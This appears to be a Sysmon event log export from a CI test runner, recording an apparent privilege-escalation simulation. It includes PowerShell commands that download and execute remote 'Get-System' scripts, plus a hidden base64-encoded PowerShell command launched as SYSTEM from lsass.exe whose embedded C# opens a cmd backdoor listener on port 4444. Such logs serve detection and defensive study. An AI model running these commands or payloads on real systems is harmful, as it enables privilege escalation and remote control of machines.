"12/17/2025 7:56:29 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:29.486
ProcessGuid: {f995aebf-622d-6942-8503-000000000e00}
ProcessId: 3636
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -w 2 -noni -noP -sta -enc JABlAGEAcwB5AGIAaQBuAGQAIAA9ACAAQAAiAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzADsACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAE4AZQB0ADsACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBUAGgAcgBlAGEAZABpAG4AZwA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBJAE8AOwAKAG4AYQBtAGUAcwBwAGEAYwBlACAAQgBhAGMAawBkAG8AbwByAFMAZQByAHYAZQByAAoAewAKACAAIAAgACAAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABCAGEAYwBrAGQAbwBvAHIACgAgACAAIAAgAHsACgAgACAAIAAgACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAFQAYwBwAEwAaQBzAHQAZQBuAGUAcgAgAGwAaQBzAHQAZQBuAGUAcgA7AAoAIAAgACAAIAAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABTAG8AYwBrAGUAdAAgAG0AYQBpAG4AUwBvAGMAawBlAHQAOwAKACAAIAAgACAAIAAgACAAIABwAHIAaQB2AGEAdABlACAAaQBuAHQAIABwAG8AcgB0ADsACgAgACAAIAAgACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAFMAdAByAGkAbgBnACAAbgBhAG0AZQA7AAoAIAAgACAAIAAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABiAG8AbwBsACAAdgBlAHIAYgBvAHMAZQA7AAoAIAAgACAAIAAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABQAHIAbwBjAGUAcwBzACAAcwBoAGUAbABsADsACgAgACAAIAAgACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACAAZgByAG8AbQBTAGgAZQBsAGwAOwAKACAAIAAgACAAIAAgACAAIABwAHIAaQB2AGEAdABlACAAUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAIAB0AG8AUwBoAGUAbABsADsACgAgACAAIAAgACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACAAaQBuAFMAdAByAGUAYQBtADsACgAgACAAIAAgACAAIAAgACAAcAByAGkAdgBhAHQAZQAgAFMAdAByAGUAYQBtAFcAcgBpAHQAZQByACAAbwB1AHQAUwB0AHIAZQBhAG0AOwAKACAAIAAgACAAIAAgACAAIABwAHIAaQB2AGEAdABlACAAVABoAHIAZQBhAGQAIABzAGgAZQBsAGwAVABoAHIAZQBhAGQAOwAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAdgBvAGkAZAAgAF8AYgBpAG4AZAAoAHMAdAByAGkAbgBnACAAaQBwACwAIABJAG4AdAAzADIAIABwAG8AcgB0ACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEIAYQBjAGsAZABvAG8AcgAgAGIAZAAgAD0AIABuAGUAdwAgAEIAYQBjAGsAZABvAG8AcgAoACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAZAAuAHMAdABhAHIAdABTAGUAcgB2AGUAcgAoAGkAcAAsAHAAbwByAHQAKQA7AAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIAB2AG8AaQBkACAAcwB0AGEAcgB0AFMAZQByAHYAZQByACgAcwB0AHIAaQBuAGcAIABuAHMALABpAG4AdAAgAHAAbwByAHQAYQAsACAAYgBvAG8AbAAgAHYAZQByAGIAPQBmAGEAbABzAGUAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAByAHkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABuAGEAbQBlACAAPQAgAG4AcwA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAG8AcgB0ACAAPQAgAHAAbwByAHQAYQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB2AGUAcgBiAG8AcwBlACAAPQAgAHYAZQByAGIAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBQAEEAZABkAHIAZQBzAHMAIABpAHAAIAA9ACAASQBQAEEAZABkAHIAZQBzAHMALgBQAGEAcgBzAGUAKABuAHMAKQA7AAoACgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAB2AGUAcgBiAG8AcwBlACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQwBvAG4AcwBvAGwAZQAuAFcAcgBpAHQAZQBMAGkAbgBlACgAIgBMAGkAcwB0AGUAbgBpAG4AZwAgAG8AbgAgAHAAbwByAHQAIAAiACAAKwAgAHAAbwByAHQAKQA7AAoAbABpAHMAdABlAG4AZQByACAAPQAgAG4AZQB3ACAAVABjAHAATABpAHMAdABlAG4AZQByACgAaQBwACwAIABwAG8AcgB0ACkAOwAKAGwAaQBzAHQAZQBuAGUAcgAuAFMAdABhAHIAdAAoACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbQBhAGkAbgBTAG8AYwBrAGUAdAAgAD0AIABsAGkAcwB0AGUAbgBlAHIALgBBAGMAYwBlAHAAdABTAG8AYwBrAGUAdAAoACkAOwAKAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoAHYAZQByAGIAbwBzAGUAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABDAG8AbgBzAG8AbABlAC4AVwByAGkAdABlAEwAaQBuAGUAKAAiAEMAbABpAGUAbgB0ACAAYwBvAG4AbgBlAGMAdABlAGQAOgAgACIAIAArACAAbQBhAGkAbgBTAG8AYwBrAGUAdAAuAFIAZQBtAG8AdABlAEUAbgBkAFAAbwBpAG4AdAApADsACgBTAHQAcgBlAGEAbQAgAHMAIAA9ACAAbgBlAHcAIABOAGUAdAB3AG8AcgBrAFMAdAByAGUAYQBtACgAbQBhAGkAbgBTAG8AYwBrAGUAdAApADsACgBpAG4AUwB0AHIAZQBhAG0AIAA9ACAAbgBlAHcAIABTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAHMAKQA7AAoAbwB1AHQAUwB0AHIAZQBhAG0AIAA9ACAAbgBlAHcAIABTAHQAcgBlAGEAbQBXAHIAaQB0AGUAcgAoAHMAKQA7AAoAbwB1AHQAUwB0AHIAZQBhAG0ALgBBAHUAdABvAEYAbAB1AHMAaAAgAD0AIAB0AHIAdQBlADsAIAAgACAAIAAgAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAGgAZQBsAGwAIAA9ACAAbgBlAHcAIABQAHIAbwBjAGUAcwBzACgAKQA7AAoAcwBoAGUAbABsAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIAA9ACAAUAByAG8AYwBlAHMAcwBXAGkAbgBkAG8AdwBTAHQAeQBsAGUALgBIAGkAZABkAGUAbgA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABQAHIAbwBjAGUAcwBzAFMAdABhAHIAdABJAG4AZgBvACAAcAAgAD0AIABuAGUAdwAgAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AKAAiAGMAbQBkACIAKQA7AAoAcAAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAD0AIABQAHIAbwBjAGUAcwBzAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAuAEgAaQBkAGQAZQBuADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAALgBDAHIAZQBhAHQAZQBOAG8AVwBpAG4AZABvAHcAIAA9ACAAdAByAHUAZQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAC4AVQBzAGUAUwBoAGUAbABsAEUAeABlAGMAdQB0AGUAIAA9ACAAZgBhAGwAcwBlADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAEUAcgByAG8AcgAgAD0AIAB0AHIAdQBlADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAEkAbgBwAHUAdAAgAD0AIAB0AHIAdQBlADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHAALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0ACAAPQAgAHQAcgB1AGUAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwBoAGUAbABsAC4AUwB0AGEAcgB0AEkAbgBmAG8AIAA9ACAAcAA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAGgAZQBsAGwALgBTAHQAYQByAHQAKAApADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAbwBTAGgAZQBsAGwAIAA9ACAAcwBoAGUAbABsAC4AUwB0AGEAbgBkAGEAcgBkAEkAbgBwAHUAdAA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABmAHIAbwBtAFMAaABlAGwAbAAgAD0AIABzAGgAZQBsAGwALgBTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdABvAFMAaABlAGwAbAAuAEEAdQB0AG8ARgBsAHUAcwBoACAAPQAgAHQAcgB1AGUAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwBoAGUAbABsAFQAaAByAGUAYQBkACAAPQAgAG4AZQB3ACAAVABoAHIAZQBhAGQAKABuAGUAdwAgAFQAaAByAGUAYQBkAFMAdABhAHIAdAAoAGcAZQB0AFMAaABlAGwAbABJAG4AcAB1AHQAKQApADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAaABlAGwAbABUAGgAcgBlAGEAZAAuAFMAdABhAHIAdAAoACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwB1AHQAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUATABpAG4AZQAoACIAUwB5AHMAdABlAG0AIABTAGgAZQBsAGwAIABzAHQAYQByAHQAZQBkACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkALgAiACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwB1AHQAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUATABpAG4AZQAoACIAUwB0AGEAcgB0AGkAbgBnACAAcwBoAGUAbABsAC4ALgAuAFwAbgAiACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAZwBlAHQASQBuAHAAdQB0ACgAKQA7AAoAZAByAG8AcABDAG8AbgBuAGUAYwB0AGkAbwBuACgAKQA7AAoACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApACAAewAgAGQAcgBvAHAAQwBvAG4AbgBlAGMAdABpAG8AbgAoACkAOwAgAH0ACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAB2AG8AaQBkACAAZwBlAHQAUwBoAGUAbABsAEkAbgBwAHUAdAAoACkACgB7AAoAIAAgACAAIAB0AHIAeQAKACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIABTAHQAcgBpAG4AZwAgAHQAZQBtAHAAQgB1AGYAIAA9ACAAIgAiADsACgAgACAAIAAgACAAIAAgACAAbwB1AHQAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUATABpAG4AZQAoACIAXAByAFwAbgAiACkAOwAKACAAIAAgACAAIAAgACAAIAB3AGgAaQBsAGUAIAAoACgAdABlAG0AcABCAHUAZgAgAD0AIABmAHIAbwBtAFMAaABlAGwAbAAuAFIAZQBhAGQATABpAG4AZQAoACkAKQAgACEAPQAgAG4AdQBsAGwAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbwB1AHQAUwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUATABpAG4AZQAoAHQAZQBtAHAAQgB1AGYAIAArACAAIgBcAHIAIgApADsACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIABkAHIAbwBwAEMAbwBuAG4AZQBjAHQAaQBvAG4AKAApADsACgAgACAAIAAgAH0ACgAgACAAIAAgAGMAYQB0AGMAaAAgACgARQB4AGMAZQBwAHQAaQBvAG4AKQAgAHsAfQAKAH0ACgBwAHIAaQB2AGEAdABlACAAdgBvAGkAZAAgAGcAZQB0AEkAbgBwAHUAdAAoACkACgB7AAoAIAAgACAAIAB0AHIAeQAKACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIABTAHQAcgBpAG4AZwAgAHQAZQBtAHAAQgB1AGYAZgAgAD0AIAAiACIAOwAKACAAIAAgACAAIAAgACAAIAB3AGgAaQBsAGUAIAAoACgAKAB0AGUAbQBwAEIAdQBmAGYAIAA9ACAAaQBuAFMAdAByAGUAYQBtAC4AUgBlAGEAZABMAGkAbgBlACgAKQApACAAIQA9ACAAbgB1AGwAbAApACkACgAgACAAIAAgACAAIAAgACAAewAgAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAB2AGUAcgBiAG8AcwBlACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEMAbwBuAHMAbwBsAGUALgBXAHIAaQB0AGUATABpAG4AZQAoACIAUgBlAGMAZQBpAHYAZQBkACAAYwBvAG0AbQBhAG4AZAA6ACAAIgAgACsAIAB0AGUAbQBwAEIAdQBmAGYAKQA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaABhAG4AZABsAGUAQwBvAG0AbQBhAG4AZAAoAHQAZQBtAHAAQgB1AGYAZgApADsACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAKACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApACAAewAgAH0ACgB9AAoACgBwAHIAaQB2AGEAdABlACAAdgBvAGkAZAAgAGgAYQBuAGQAbABlAEMAbwBtAG0AYQBuAGQAKABTAHQAcgBpAG4AZwAgAGMAbwBtACkACgB7AAoAIAAgACAAIAB0AHIAeQAKACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoAGMAbwBtAC4ARQBxAHUAYQBsAHMAKAAiAGUAeABpAHQAIgApACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG8AdQB0AFMAdAByAGUAYQBtAC4AVwByAGkAdABlAEwAaQBuAGUAKAAiAFwAbgBcAG4AQwBsAG8AcwBpAG4AZwAgAHQAaABlACAAcwBoAGUAbABsACAAYQBuAGQAIABEAHIAbwBwAHAAaQBuAGcAIAB0AGgAZQAgAGMAbwBuAG4AZQBjAHQAaQBvAG4ALgAuAC4AIgApADsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABkAHIAbwBwAEMAbwBuAG4AZQBjAHQAaQBvAG4AKAApADsACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAB0AG8AUwBoAGUAbABsAC4AVwByAGkAdABlAEwAaQBuAGUAKABjAG8AbQAgACsAIAAiAFwAcgBcAG4AIgApADsACgAgACAAIAAgAH0ACgAgACAAIAAgAGMAYQB0AGMAaAAgACgARQB4AGMAZQBwAHQAaQBvAG4AKQAgAHsAIABkAHIAbwBwAEMAbwBuAG4AZQBjAHQAaQBvAG4AKAApADsAIAB9AAoAfQAKAHAAcgBpAHYAYQB0AGUAIAB2AG8AaQBkACAAZAByAG8AcABDAG8AbgBuAGUAYwB0AGkAbwBuACgAKQAKAHsACgAgACAAIAAgAHQAcgB5AAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAdgBlAHIAYgBvAHMAZQApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQwBvAG4AcwBvAGwAZQAuAFcAcgBpAHQAZQBMAGkAbgBlACgAIgBEAHIAbwBwAHAAaQBuAGcAIABDAG8AbgBuAGUAYwB0AGkAbwBuACIAKQA7AAoAIAAgACAAIAAgACAAIAAgAHMAaABlAGwAbAAuAEMAbABvAHMAZQAoACkAOwAKACAAIAAgACAAIAAgACAAIABzAGgAZQBsAGwALgBEAGkAcwBwAG8AcwBlACgAKQA7AAoAIAAgACAAIAAgACAAIAAgAHMAaABlAGwAbABUAGgAcgBlAGEAZAAuAEEAYgBvAHIAdAAoACkAOwAKACAAIAAgACAAIAAgACAAIABzAGgAZQBsAGwAVABoAHIAZQBhAGQAIAA9ACAAbgB1AGwAbAA7AAoAIAAgACAAIAAgACAAIAAgAGkAbgBTAHQAcgBlAGEAbQAuAEQAaQBzAHAAbwBzAGUAKAApADsACgAgACAAIAAgACAAIAAgACAAbwB1AHQAUwB0AHIAZQBhAG0ALgBEAGkAcwBwAG8AcwBlACgAKQA7AAoAIAAgACAAIAAgACAAIAAgAHQAbwBTAGgAZQBsAGwALgBEAGkAcwBwAG8AcwBlACgAKQA7AAoAIAAgACAAIAAgACAAIAAgAGYAcgBvAG0AUwBoAGUAbABsAC4ARABpAHMAcABvAHMAZQAoACkAOwAKACAAIAAgACAAIAAgACAAIABzAGgAZQBsAGwALgBEAGkAcwBwAG8AcwBlACgAKQA7AAoAIAAgACAAIAAgACAAIAAgAG0AYQBpAG4AUwBvAGMAawBlAHQALgBDAGwAbwBzAGUAKAApADsACgAgACAAIAAgACAAIAAgACAAbABpAHMAdABlAG4AZQByAC4AUwB0AG8AcAAoACkAOwAKACAAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgA7AAoAIAAgACAAIAB9AAoAIAAgACAAIABjAGEAdABjAGgAIAAoAEUAeABjAGUAcAB0AGkAbwBuACkAIAB7ACAAfQAKAH0AIAAgACAAIAAKACAAIAAgACAAfQAKAH0ACgAiAEAACgBBAGQAZAAtAFQAeQBwAGUAIAAtAFQAeQBwAGUARABlAGYAaQBuAGkAdABpAG8AbgAgACQAZQBhAHMAeQBiAGkAbgBkAAoAWwBCAGEAYwBrAGQAbwBvAHIAUwBlAHIAdgBlAHIALgBCAGEAYwBrAGQAbwBvAHIAXQA6ADoAXwBiAGkAbgBkACgAIgAxADIANwAuADAALgAwAC4AMQAiACwAIgA0ADQANAA0ACIAKQAKAA==
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: NT AUTHORITY\SYSTEM
LogonGuid: {f995aebf-5f5c-6942-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 2
IntegrityLevel: System
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-5f5c-6942-0d00-000000000e00}
ParentProcessId: 992
ParentImage: C:\Windows\System32\lsass.exe
ParentCommandLine: C:\Windows\system32\lsass.exe
ParentUser: NT AUTHORITY\SYSTEM"
"12/17/2025 7:56:29 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:29.476
ProcessGuid: {f995aebf-622c-6942-8103-000000000e00}
ProcessId: 7292
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\4p2cjdmg\4p2cjdmg.dll
Hashes: SHA256=4722A51112CE30C27CF62C9EF2F5AA487B1353F348BB2816F776CDBF471C2467
IsExecutable: true
Archived: true"
"12/17/2025 7:56:29 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:56:29.462
ProcessGuid: {f995aebf-622d-6942-8303-000000000e00}
ProcessId: 8892
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\4p2cjdmg\4p2cjdmg.dll
CreationUtcTime: 2025-12-17 07:56:29.364
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:29 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:29.462
ProcessGuid: {f995aebf-622d-6942-8303-000000000e00}
ProcessId: 8892
User: runnervm8j6r3\runneradmin
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\4p2cjdmg\4p2cjdmg.dll
Hashes: SHA256=E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855
IsExecutable: false
Archived: true"
"12/17/2025 7:56:29 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:56:29.364
ProcessGuid: {f995aebf-622c-6942-8103-000000000e00}
ProcessId: 7292
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\4p2cjdmg\4p2cjdmg.dll
CreationUtcTime: 2025-12-17 07:56:29.364
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:29 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:29.102
ProcessGuid: {f995aebf-622c-6942-8103-000000000e00}
ProcessId: 7292
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_clpe1oj4.vyo.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:56:29 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:56:29.077
ProcessGuid: {f995aebf-622c-6942-8103-000000000e00}
ProcessId: 7292
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_clpe1oj4.vyo.ps1
CreationUtcTime: 2025-12-17 07:56:29.077
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:28 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:28.987
ProcessGuid: {f995aebf-622c-6942-8103-000000000e00}
ProcessId: 7292
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:28 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:28.845
ProcessGuid: {f995aebf-622c-6942-7f03-000000000e00}
ProcessId: 3560
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Windows\SystemTemp\__PSScriptPolicyTest_zej414wq.qqj.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:56:28 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:28.649
ProcessGuid: {f995aebf-622c-6942-7903-000000000e00}
ProcessId: 4940
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\54hkszpm\54hkszpm.dll
Hashes: SHA256=4F4909BCC4DDA08144364CC962D03AC6FE5702AF9134C48237CB29CBE4A10080
IsExecutable: true
Archived: true"
"12/17/2025 7:56:28 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:56:28.626
ProcessGuid: {f995aebf-622c-6942-7d03-000000000e00}
ProcessId: 1308
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\54hkszpm\54hkszpm.dll
CreationUtcTime: 2025-12-17 07:56:28.510
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:28 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:28.625
ProcessGuid: {f995aebf-622c-6942-7d03-000000000e00}
ProcessId: 1308
User: runnervm8j6r3\runneradmin
Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\54hkszpm\54hkszpm.dll
Hashes: SHA256=E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855
IsExecutable: false
Archived: true"
"12/17/2025 7:56:28 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:56:28.510
ProcessGuid: {f995aebf-622c-6942-7903-000000000e00}
ProcessId: 4940
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\54hkszpm\54hkszpm.dll
CreationUtcTime: 2025-12-17 07:56:28.510
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:28 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:28.177
ProcessGuid: {f995aebf-622c-6942-7903-000000000e00}
ProcessId: 4940
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_h4qypbqi.5ue.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:56:28 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:56:28.152
ProcessGuid: {f995aebf-622c-6942-7903-000000000e00}
ProcessId: 4940
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_h4qypbqi.5ue.ps1
CreationUtcTime: 2025-12-17 07:56:28.151
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:28 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:28.007
ProcessGuid: {f995aebf-622c-6942-7903-000000000e00}
ProcessId: 4940
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
